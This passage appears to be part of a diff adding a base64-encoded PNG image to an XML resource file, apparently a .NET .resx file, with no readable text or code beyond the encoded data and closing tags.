+xMwAAMpxZFe/PHfb6uy9OcscITQAb2gAaSGGBmCDTUaejmKTkQLQALyhAaSFuBoARjeGRmTdzDaV
+AShwDacINABvaABpIa4GoPsDTvcMyuKvb3GXOyJoAN7QANJCjA0AoEwYhVnw+fL0B9AAvKEBpIWY
+G4BNW/1hJdQgWX8KQQPwhgaQFpJgAHq248ZnsclItP0BNABvaABpIQkGoIP6bO+QLLmvWaZHsMmI
+DQxg9k2WHN7ZF+v7LwUagIYG4IOEGABA+Y63n5QX/2xdZP0BygA+ZanswnG/f7/QADQ0AB8kyAAU
+mTHZv6Y7mk1GaAB5oQGkhQQawMiF7CYjmKYdtj+ABuANDSAtJM0A7AA/eV6WfX976P4AGoA3NIC0
+kEADACjrif2nZOHd4foDaADe0ADSQkINQIH+gLXd8sxnsCuQx735gAbgzaQwAIwdr57Ron7khy9f
+LA9fXkucXLZY5ebf9cah5AlA9wdseGavagoE+Y0fumyxzPzEcrW/YOLuPw/KAPqH5Kdf2SAPfqj0
+Z4LnCM1AO9CQ8/x+qboBIOMstqHaMHuvrJ/VJutn4V8ykTY1wQbTbSEo5zOMO1gv0N91RjabHbJ+
+ZoDfeGabbHmuQ+UggHCc508kOrEKanVYTOW656K0Kc1AO9CQ6/w+qboBALg6zkEKAyE5n11SgHCd
+91MqSTS/Yrx30X2fpRC2RoRzVN0ACCHVgQZASIqhARCSYmgAhKQYGgAhKYYGQEiKoQEQkmJoAISk
+GBoAISmGBkBIiqEBEJJiaACEpBgaACEphgZASIqhARCSYmgAhKQYGgAhKYYGQEiKoQEQkmJoAISk
+GBoAISmGBkBIiqEBEJJiaACEpBgaACEphgZASIqhARCSYmgAhKQYGgAhKQbahYYDGwDcgwZASDLB
+7sTNswvWAH4FA/iFxx/Ul7Y+3R56i2JCSHWAdrc+1V7IAH4OA8h4/EHmXlUvTdPbXCclhCQHaBha
+dupbk4EB9Hv8QeZdVS9r72+RkeFR10kJIfEH2oWGoWWnvjX9MIAOjz+oLzV8c4cMn7sgYxn3yQkh
+MSYzprQLDRcwgA4YwBqPP8i8q+tlyZc3y+DAeRoAIUkjM6a0Cw1Dy059a9bAABZ6/EF96dVb18mZ
+7kHJ0AAISRTQLLQLDRcwgIUwgB94jQTMq7Fk4Y2rpGfXAEcCCEkY0GxPy4DSMLTs1LdpWL80DesB
+GMAXPEcCaixZcF2DdCw9IpmLNABCkgQ0u3/ZUVlwfYPSskvfWc1/EQZQYxpWr8cHVOeBGgocdV+A
+EBJjRrNDgAU6AKH5GhjA+03DWufxAdV2qLurSc71DrEfgJCEAK1Cs9BugfY/NP9+GAB43OMDqurw
+wg0rpWv9cTYDCEkI0GrXhuNKu3mq/wCaf59tAOgH+E+PDykH2Txjr4yyGUBIMhgdU5ot8PaH1qH5
+cQO4zDSsLo8PqpO8fvsGOdl5lqMBhMQcaBRahWYLGAC0Ds2PG8Cvm4b1oscHFfOvXSF7FnXSAAiJ
+OdAotArNOnWcA7QOzb9PHdoE7jIN6789PqycZPlXt8nQyWHOCiQkrmTGlEah1QJvf2gcWs+KP8cA
+Pmga1h6PL6iOhOenNcoBq5u1AEJiCrQJjUKrBTr/WrXWXQYAHjQN6389vpStBdybrQVwSJCQeAFN
+qrf/vQXf/v9nGtZDtt4nHPo/rzMN64THF7MzA69vkNZXOl0XJ4RUH2izwMw/AG1D4xPFn2MA6BiY
+4/FFBZzljTs2ckSAkBhh9/xDmwXe/mDuhM4/56FN4IZ8SUIUUy3Z8sS+bKIQNgUIqS6ZbOIPaBLa
+dOn1EtD07+YVP46cWsBM3V5wniS7SvCTq6RzbQ9rAYRUGWgQWoQm86z6A9DyrIJvf/vQJjDVNKxO
+jxNlTQBrBO5ukv4Dp2kChFQJaA8ahBaLVP2hZWjaKXf3kTMi8B1kDfU4WdYEaixp+MYOGew7TxMg
+pMJAc9AeNFjgzQ+g4e969vznO/SHP2AaVoPHCceZf80K2fLkPrkwNMKhQUIqBLQGzUF70KBTlw6g
+YWjZKfP8R04t4FN5hwWBniC0c94BVSB2ChJSZrT4obkiE34AtAsN+3/724f+0q+ZhvXtfFOEAaof
+z3+sUXaaB1kTIKSM2G/+nfMPKs0VqfpDs9AuNOyUt79Dm8Bv6cShnjMEJ5gAagKDI+wTICRioClo
+S735i4sfWoVmoV2nrEs7tAl82DSsjR4XmmgC0xpVu4Qdg4REh93hB21BY0XED6BVaNYp59KPnP6A
+j5uGtd/jYpeoyXYMYjOC8SFCNgkICUbm0lAfNKU6/IqLHxqFVktv9+c7ckzgc6ZhdXtcdAJwKIxN
+YoICZimxNkBIaUAz0A40pMb5iwsfQJu3RCp++8gxgdtNw+rxuPhEE7i6Xs1OwhRFzFNWN8XaACEF
+sTUCzUA7aoZf4Uk+NsdNw/p8WcRvHzkmcJtpWEc8CjHRBOBaUy21SAErldRSYjYLCHGjq/vQCLQC
+zUA7Pt/80CI0WT7x20eOCaCq4bmxqBM4GJYpYq0yEhbYRsCmAUk7tg6gCWgDGoFWfL71ATRYnmp/
+viPHBNDZgB7HvEOE49RkjQC9mMvv2SatizpVNQfZhpHGmM0DkhYQ64h5xD400Ppqlyy/tznbww/h
++3vrQ3PQXrQdfn6PHBNAdtEXCk0WmoA2AiQtROZSpC/GvgPYyGDcDOCKMAQbj4dISOzR8asEj5jW
+okesI+YR+9AAtFCC8AG0Bs2pzL4VF3/uoQuACQeYdeS5xVg+cNMAGxhgF5NN09ukY9kR6dk9oHY2
+xfbG2ONc5R7Q1aX3LmbkvZ8REkP0ywuxiphF7CKGEcvYZBf7bCLG0auPmLfj36mLIkBj0Fr4ST5R
+HdoEMOUQ846x+OB/PAqeH10rwD5maP9gR1Nsa4y9zTH+ue7+FrXP2dan2qV5dodsf3a/ND/TQUhs
+UDE5u0PFKGIVMYvYRQwjlhHT2GwXMV7i294GmmrUGgs+vbdcR06TACuPsPzwXV99A05gBrYhaFMA
+c8GVhCQAHbO22BUQfOmiB9AQtARNqVV9sRN/7pFTGzB0ZqGBfNmFCCF5gWagHWgIWorfW7/QoY3g
+N3SOQSQaRdvlVx43Sgi5BDTSpxN4QjvQkFNeyTlyjOAjOic5Nib4L48bJyTNQBPQBjRyfeKF7zxy
+mgbYlQRbE2F/MmxSiJ1K2UQgaQMxj9iHBqAFaALaSFZVP8iRUyvAOOYdeq/ytTqDScY0rF96PDBC
+kswvdGwjxhHriHnEPjQwud72pRw5NYPfNg2rxjSsO03DekAnNMCDwlRH5DTHw0OCw9JHFgipDIhN
+xChiFTGL2EUMI5bvNw3rCzrGEeuxeNP/Py00TeQLRaJJAAAAAElFTkSuQmCCCw==</value></data></root>
